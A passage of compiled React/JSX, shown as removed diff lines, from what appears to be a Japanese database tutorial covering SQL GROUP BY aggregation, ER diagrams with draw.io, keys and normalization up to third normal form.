-`]}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- ❌ これはエラーになる！
-SELECT 
-    s.name AS 学生名,
-    COUNT(e.id) AS 受講コース数,
-    SUM(c.fee) AS 支払い総額
-FROM students s
-INNER JOIN enrollments e ON s.id = e.student_id
-INNER JOIN courses c ON e.course_id = c.id;
--- GROUP BY がないとエラー！
-`})}),e.jsxs(s.ol,{start:"2",children:[`
-`,e.jsx(s.li,{children:e.jsx(s.strong,{children:"GROUP BYを追加（学生別に集計）"})}),`
-`]}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- 学生別の受講コース数と支払い総額
-SELECT
-    s.name AS 学生名,
-    COUNT(e.id) AS 受講コース数,
-    SUM(c.fee) AS 支払い総額,
-    AVG(c.fee) AS 平均受講料
-FROM students s
-INNER JOIN enrollments e ON s.id = e.student_id
-INNER JOIN courses c ON e.course_id = c.id
-GROUP BY s.id, s.name
-ORDER BY 支払い総額 DESC;
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実行結果："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"学生名"}),e.jsx(s.th,{children:"受講コース数"}),e.jsx(s.th,{children:"支払い総額"}),e.jsx(s.th,{children:"平均受講料"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"3"}),e.jsx(s.td,{children:"155000"}),e.jsx(s.td,{children:"51666.67"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"鈴木一郎"}),e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"50000"}),e.jsx(s.td,{children:"50000.00"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"佐藤花子"}),e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"45000"}),e.jsx(s.td,{children:"45000.00"})]})]})]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"概念の理解："})}),e.jsx(i,{children:`
-graph TD
-  A["実行前：個別の受講記録"] --> B["GROUP BY s.id, s.name"]
-  B --> C["実行後：学生別集計結果"]
-  
-  subgraph before["実行前の状態"]
-      D["田中太郎 | PHP基礎 | 50000"]
-      E["田中太郎 | React応用 | 60000"]
-      F["田中太郎 | JavaScript基礎 | 45000"]
-      G["佐藤花子 | JavaScript基礎 | 45000"]
-      H["鈴木一郎 | PHP基礎 | 50000"]
-  end
-  
-  subgraph after["実行後の状態"]
-      I["田中太郎 | 3コース | 155000円"]
-      J["佐藤花子 | 1コース | 45000円"]
-      K["鈴木一郎 | 1コース | 50000円"]
-  end
-  
-  style I fill:#dcfce7
-  style J fill:#dcfce7
-  style K fill:#dcfce7
-`}),e.jsxs(r,{type:"tip",title:"GROUP BYで複数列を指定する理由",children:[e.jsxs(s.p,{children:[e.jsx(s.code,{children:"s.id, s.name"}),"のように複数列を指定するのは："]}),e.jsxs(s.ul,{children:[`
-`,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"s.id"}),"だけでもグループ化は可能（学生IDは重複しないため）"]}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"s.name"}),"も追加することで、SELECT句で学生名を表示可能"]}),`
-`,e.jsx(s.li,{children:"一般的には主キー + 表示したい列をGROUP BYに含める"}),`
-`]})]})]}),`
-`,e.jsxs(n,{summary:"演習6: 講師別・コース別の分析",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"講師別の担当状況："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- 講師別の担当コース数と受講生数
-SELECT
-    i.name AS 講師名,
-    COUNT(DISTINCT c.id) AS 担当コース数,
-    COUNT(e.id) AS 受講生数,
-    SUM(c.fee) AS 総売上
-FROM instructors i
-INNER JOIN courses c ON i.id = c.instructor_id
-LEFT JOIN enrollments e ON c.id = e.course_id
-GROUP BY i.id, i.name
-ORDER BY 総売上 DESC;
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実行結果："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"講師名"}),e.jsx(s.th,{children:"担当コース数"}),e.jsx(s.th,{children:"受講生数"}),e.jsx(s.th,{children:"総売上"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:"2"}),e.jsx(s.td,{children:"3"}),e.jsx(s.td,{children:"160000"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中先生"}),e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"2"}),e.jsx(s.td,{children:"90000"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"山田先生"}),e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"0"}),e.jsx(s.td,{children:"0"})]})]})]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"コース別の人気ランキング："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- コース別の受講生数ランキング
-SELECT
-    c.name AS コース名,
-    i.name AS 担当講師,
-    COUNT(e.id) AS 受講生数,
-    c.fee AS 受講料,
-    (COUNT(e.id) * c.fee) AS コース総売上
-FROM courses c
-INNER JOIN instructors i ON c.instructor_id = i.id
-LEFT JOIN enrollments e ON c.id = e.course_id
-GROUP BY c.id, c.name, i.name, c.fee
-ORDER BY 受講生数 DESC;
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実行結果："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"コース名"}),e.jsx(s.th,{children:"担当講師"}),e.jsx(s.th,{children:"受講生数"}),e.jsx(s.th,{children:"受講料"}),e.jsx(s.th,{children:"コース総売上"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"PHP基礎"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:"2"}),e.jsx(s.td,{children:"50000"}),e.jsx(s.td,{children:"100000"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"JavaScript基礎"}),e.jsx(s.td,{children:"田中先生"}),e.jsx(s.td,{children:"2"}),e.jsx(s.td,{children:"45000"}),e.jsx(s.td,{children:"90000"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"React応用"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"60000"}),e.jsx(s.td,{children:"60000"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"Python基礎"}),e.jsx(s.td,{children:"山田先生"}),e.jsx(s.td,{children:"0"}),e.jsx(s.td,{children:"55000"}),e.jsx(s.td,{children:"0"})]})]})]})]}),`
-`,e.jsx(s.h2,{children:"データモデリングの基礎"}),`
-`,e.jsxs(n,{summary:"データモデリングの必要性",children:[e.jsx(s.p,{children:"データモデリングを行う理由は以下の通りです："}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データ整合性の確保"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データ間の正確な関係を定義し、データの一貫性と正確性を保証する"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13 10V3L4 14h7v7l9-11h-7z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"効率的なデータアクセス"}),e.jsx("div",{className:"text-sm text-slate-600",children:"適切に構造化されたデータモデルを通じて、データの検索、更新、削除が効率的に実施"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsxs("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:[e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 12a3 3 0 11-6 0 3 3 0 016 0z"}),e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"})]})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"複雑なデータ関係の可視化"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ER図などのデータモデリングツールを使用して、複雑なデータの関係性を明確に理解し、可視化"})]})]})]})})]}),`
-`,e.jsxs(n,{summary:"エンティティとは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"エンティティ"}),"はデータベースで管理される情報の単位です。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例：学校のデータベースの場合のエンティティ"})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"「生徒」「先生」「授業」...など"}),`
-`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"各エンティティは属性を持つ："})}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-3",children:"「生徒」エンティティの属性例"}),e.jsxs("div",{className:"grid grid-cols-3 gap-2",children:[e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"名前"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"学年"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"クラス"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"学籍番号"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"生年月日"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"..."})]})]})}),e.jsx(r,{type:"tip",title:"ポイント",children:e.jsx(s.p,{children:"エンティティは「テーブル」として実装され、属性は「カラム（列）」として実装されます。"})})]}),`
-`,e.jsxs(n,{summary:"リレーションシップとは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"リレーションシップ"}),"はエンティティ間の関連性を示します。"]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"例："})," 「生徒」は「授業」に「参加する」というリレーションシップがある"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"リレーションシップの種類："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"1:1"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"一対一（One-to-One）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"1つのレコードが別のテーブルの1つのレコードとだけ関連"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"1:N"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"一対多（One-to-Many）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"1つのレコードが別のテーブルの複数レコードと関連"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"N:M"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"多対多（Many-to-Many）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"複数のレコードが別のテーブルの複数レコードと関連"})]})]})]})})]}),`
-`,e.jsxs(n,{summary:"キーの概念（プライマリキー・外部キー）",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"プライマリキー（主キー）"})}),e.jsx(s.p,{children:"各エンティティ内のレコードを一意に識別するためのキーです。"}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-2",children:"プライマリキーの特徴"}),e.jsxs("div",{className:"text-sm text-blue-700 space-y-1",children:[e.jsx("div",{children:"例: 「生徒ID」は生徒エンティティのプライマリキー"}),e.jsxs("div",{children:["プライマリキーの値は",e.jsx("strong",{children:"重複や変更が許容されない"})]})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"外部キー（Foreign Key）"})}),e.jsx(s.p,{children:"異なるエンティティ間のリレーションシップを表現するためのキーです。"}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"外部キーの特徴"}),e.jsxs("div",{className:"text-sm text-green-700 space-y-1",children:[e.jsx("div",{children:"あるエンティティのプライマリキーを別のエンティティの属性として含む"}),e.jsx("div",{children:"例: 「授業」エンティティに「生徒ID」を外部キーとして持たせる"}),e.jsx("div",{children:"→「どの生徒がどの授業に参加しているか」を表現"})]})]})})]}),`
-`,e.jsxs(n,{summary:"ER図とは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"ER図"}),"（Entity Relationship Diagram）は、エンティティ・リレーションシップ図のことです。エンティティ間の関連性やキーの概念を視覚的に表現した図です。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ER図の構成要素："})}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"エンティティ"}),e.jsx("div",{className:"text-sm text-slate-600",children:"四角形で表され、エンティティ名が記載される"})]}),e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"リレーションシップ"}),e.jsx("div",{className:"text-sm text-slate-600",children:"線でエンティティ間を結び、関連性の種類を示す"})]}),e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"属性"}),e.jsx("div",{className:"text-sm text-slate-600",children:"エンティティに紐づく情報（カラム）"})]}),e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"キー"}),e.jsx("div",{className:"text-sm text-slate-600",children:"PK（主キー）、FK（外部キー）を明示する"})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ER図の例：授業と生徒の管理システム"})}),e.jsx(i,{children:`
-erDiagram
-  students {
-      int student_id PK
-      varchar name
-      int grade
-      varchar class
-  }
-
-  teachers {
-      int teacher_id PK
-      varchar name
-      varchar subject
-  }
-
-  classes {
-      int class_id PK
-      varchar class_name
-      int teacher_id FK
-  }
-
-  enrollments {
-      int enrollment_id PK
-      int student_id FK
-      int class_id FK
-      date enrollment_date
-  }
-
-  students ||--o{ enrollments : "受講"
-  classes ||--o{ enrollments : "開講"
-  teachers ||--o{ classes : "担当"
-`})]}),`
-`,e.jsx(s.h2,{children:"ER図作成演習 - draw.io（diagrams.net）"}),`
-`,e.jsxs(n,{summary:"draw.ioとは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"draw.io"}),"（現在は diagrams.net としても知られる）は、無料で使える多機能なダイアグラム作成ツールです。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"作成できる図の種類："})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"フローチャート"}),`
-`,e.jsx(s.li,{children:"プロセス図"}),`
-`,e.jsx(s.li,{children:"組織図"}),`
-`,e.jsx(s.li,{children:"UML図"}),`
-`,e.jsx(s.li,{children:e.jsx(s.strong,{children:"ER図（エンティティ・リレーションシップ図）"})}),`
-`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"利用方法："})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"Webベースで利用可能"}),`
-`,e.jsx(s.li,{children:"デスクトップアプリケーション"}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Visual Studio Code の拡張機能"}),"（今回はこれを使用）"]}),`
-`]})]}),`
-`,e.jsx(n,{summary:"主なER図作成サービスとその比較",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-2",children:"draw.io / diagrams.net"}),e.jsx("div",{className:"text-sm text-blue-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"利点:"})," 無料でアクセスしやすく、直感的な操作が可能。豊富なテンプレートとクラウド統合機能",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"欠点:"})," 専門的なデータモデリング機能には限りがある"]})})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"Lucidchart"}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"利点:"})," 直感的なインターフェースと豊富な機能。リアルタイムでの共同編集",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"欠点:"})," 無料版には機能制限があり、フル機能には有料プランが必要"]})})]}),e.jsxs("div",{className:"p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"font-medium text-orange-800 mb-2",children:"Microsoft Visio"}),e.jsx("div",{className:"text-sm text-orange-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"利点:"})," 複雑な図の作成に対応し、業界標準のツールとしての信頼性が高い",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"欠点:"})," 高価で、Microsoft製品との統合に重点"]})})]})]})})}),`
-`,e.jsxs(n,{summary:"VSCodeへの拡張機能のインストール",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. VSCode拡張機能マーケットプレイスにアクセス"})}),e.jsx(s.p,{children:"VSCodeの拡張機能タブから「Draw.io Integration」を検索してインストールします。"}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. 新しいER図の作成"})}),e.jsxs(s.p,{children:["VSCodeで新しいファイルを作成し、ファイルの拡張子を ",e.jsx(s.code,{children:".drawio"})," または ",e.jsx(s.code,{children:".dio"})," に設定します。"]}),e.jsx(s.pre,{children:e.jsx(s.code,{children:`例: database-design.drawio
-`})}),e.jsx(s.p,{children:"ファイルを保存すると、draw.ioのエディタが自動的に開きます。"}),e.jsx(r,{type:"tip",title:"テーマカラーの変更",children:e.jsx(s.p,{children:"画面右下の「Theme: XXX」を押下することで色を変更することができます。お好みのテーマを選択してください。"})})]}),`
-`,e.jsxs(n,{summary:"ER図の要素追加と作図手順",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. ER図の要素追加"})}),e.jsx(s.p,{children:"左側メニューの「その他の要素」を押下し、「ソフトウェア > ER」にチェックを入れて「適用」を押下します。"}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. エンティティの作図"})}),e.jsx(s.p,{children:"必要な形状をクリックし、ドラッグ&ドロップでキャンバスに配置します。"}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"3. エンティティの編集"})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"形状をダブルクリックしてテキストを編集"}),`
-`,e.jsx(s.li,{children:"フィールドを追加したい場合は、挿入したいフィールドを選択後、「フォーマット > 配置 > テーブル」内にあるアイコンを押下"}),`
-`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"4. リレーションの作図"})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"エンティティを未選択状態でカーソルを乗せると青い矢印が表示される"}),`
-`,e.jsx(s.li,{children:"エンティティ間をドラッグして線を引く"}),`
-`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"5. リレーションの編集"})}),e.jsx(s.p,{children:"リレーションを選択状態にすると「フォーマット > スタイル」より編集が可能になります。"}),e.jsx(r,{type:"tip",title:"よく使うアイコン",children:e.jsx(s.p,{children:"下段アイコンの「線の形状」「始点の形状」「終点の形状」をよく使います。リレーションの種類（1:1、1:N、N:M）に応じて適切な形状を選択しましょう。"})})]}),`
-`,e.jsx(s.h2,{children:"正規化の詳細演習"}),`
-`,e.jsxs(n,{summary:"正規化のプロセス",children:[e.jsx(s.p,{children:"正規化は段階的に行われ、各段階でより適切なデータ設計となります。"}),e.jsx(i,{children:`
-graph LR
-  A["非正規形"] --> B["第1正規形<br/>(1NF)"]
-  B --> C["第2正規形<br/>(2NF)"]
-  C --> D["第3正規形<br/>(3NF)"]
-  
-  style A fill:#fef2f2
-  style B fill:#fef3c7
-  style C fill:#ecfdf5
-  style D fill:#dcfce7
-`}),e.jsx(r,{type:"tip",title:"実務での正規化",children:e.jsx(s.p,{children:"一般的なWebアプリケーション開発では、第3正規形（3NF）まで正規化すれば十分です。それ以上の正規化（BCNF、4NF、5NF）は特殊なケースでのみ必要になります。"})})]}),`
-`,e.jsxs(n,{summary:"第1正規化（1NF）の詳細",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"説明："}),`
-テーブル内の各カラムに原子値（これ以上分割できない値）のみが含まれ、各カラムの値が一意のデータ型を持つこと。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"噛み砕いた説明："}),`
-各マス（セル）には `,e.jsx(s.strong,{children:"1つの情報だけ"})," を入れる。リストや複数の値を1つのマスに入れない。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"font-medium text-red-800 mb-2",children:"非正規化（NG）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-red-100",children:[e.jsx("th",{className:"p-2 border",children:"生徒名"}),e.jsx("th",{className:"p-2 border",children:"クラブ活動"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"田中太郎"}),e.jsx("td",{className:"p-2 border text-red-600",children:"サッカー部, テニス部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border text-red-600",children:"吹奏楽部, 美術部, 文芸部"})]})]})]})}),e.jsx("div",{className:"text-xs text-red-600 mt-2",children:"問題: 1つのセルに複数の値が入っている"})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"第1正規形（OK）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-2 border",children:"生徒名"}),e.jsx("th",{className:"p-2 border",children:"クラブ活動"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"田中太郎"}),e.jsx("td",{className:"p-2 border",children:"サッカー部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"田中太郎"}),e.jsx("td",{className:"p-2 border",children:"テニス部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border",children:"吹奏楽部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border",children:"美術部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border",children:"文芸部"})]})]})]})}),e.jsx("div",{className:"text-xs text-green-600 mt-2",children:"改善: 各セルに1つの値のみ"})]})]})})]}),`
-`,e.jsxs(n,{summary:"第2正規化（2NF）の詳細",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"説明："}),`
-1NFを満たし、全ての非キーカラムがプライマリキー全体に完全に依存している（部分的依存がない）こと。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"噛み砕いた説明："}),`
-テーブルが複数の情報を混在させず、`,e.jsx(s.strong,{children:"情報ごとにテーブルを分ける"}),"。プライマリキーの一部だけに依存する情報がないようにする。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"font-medium text-red-800 mb-2",children:"非2NF（NG）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-red-100",children:[e.jsx("th",{className:"p-2 border",children:"学生ID"}),e.jsx("th",{className:"p-2 border",children:"科目ID"}),e.jsx("th",{className:"p-2 border",children:"科目名"}),e.jsx("th",{className:"p-2 border",children:"成績"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"S001"}),e.jsx("td",{className:"p-2 border",children:"C001"}),e.jsx("td",{className:"p-2 border text-red-600",children:"数学"}),e.jsx("td",{className:"p-2 border",children:"85"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"S001"}),e.jsx("td",{className:"p-2 border",children:"C002"}),e.jsx("td",{className:"p-2 border text-red-600",children:"英語"}),e.jsx("td",{className:"p-2 border",children:"90"})]})]})]})}),e.jsx("div",{className:"text-xs text-red-600 mt-2",children:"問題: 科目名は科目IDにのみ依存（部分依存）"})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"第2正規形（OK）- テーブルを分割"}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"成績テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"学生ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"科目ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"成績"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"S001"}),e.jsx("td",{className:"p-1 border text-xs",children:"C001"}),e.jsx("td",{className:"p-1 border text-xs",children:"85"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"S001"}),e.jsx("td",{className:"p-1 border text-xs",children:"C002"}),e.jsx("td",{className:"p-1 border text-xs",children:"90"})]})]})]})]}),e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"科目テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"科目ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"科目名"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"C001"}),e.jsx("td",{className:"p-1 border text-xs",children:"数学"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"C002"}),e.jsx("td",{className:"p-1 border text-xs",children:"英語"})]})]})]})]})]})]})]})})]}),`
-`,e.jsxs(n,{summary:"第3正規化（3NF）の詳細",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"説明："}),`
-2NFを満たし、全ての非キーカラムが他の非キーカラムに依存していない（推移的関数従属がない）こと。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"噛み砕いた説明："}),`
-情報が他の情報に `,e.jsx(s.strong,{children:"間接的に依存しないようにする"}),"。ある情報が他の情報を経由してキーに関連している場合、その間接的な関係を取り除く。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"font-medium text-red-800 mb-2",children:"非3NF（NG）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-red-100",children:[e.jsx("th",{className:"p-2 border",children:"教師ID"}),e.jsx("th",{className:"p-2 border",children:"教師名"}),e.jsx("th",{className:"p-2 border",children:"学部ID"}),e.jsx("th",{className:"p-2 border",children:"学部名"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 